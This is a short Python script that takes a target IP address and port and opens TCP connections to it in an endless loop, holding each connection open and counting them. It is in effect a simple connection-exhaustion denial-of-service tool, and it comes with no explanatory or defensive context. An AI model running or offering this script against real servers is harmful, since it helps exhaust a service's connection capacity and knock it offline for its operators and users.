import socket
import time
import sys

if len(sys.argv) != 3:
	print("Usage: $ python3 script.py {IP} {PORT}")
	sys.exit(1)

target_ip = sys.argv[1]
target_port = int(sys.argv[2])
connections = []

try:
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        try:
        	s.connect((target_ip, target_port))
        	connections.append(s)
        	print(f"[+] Connection #{len(connections)}")
        	time.sleep(0.1)
        except:
        	print("[-] Connection error!")
        	break
except KeyboardInterrupt:
    print("[-] Stopped")
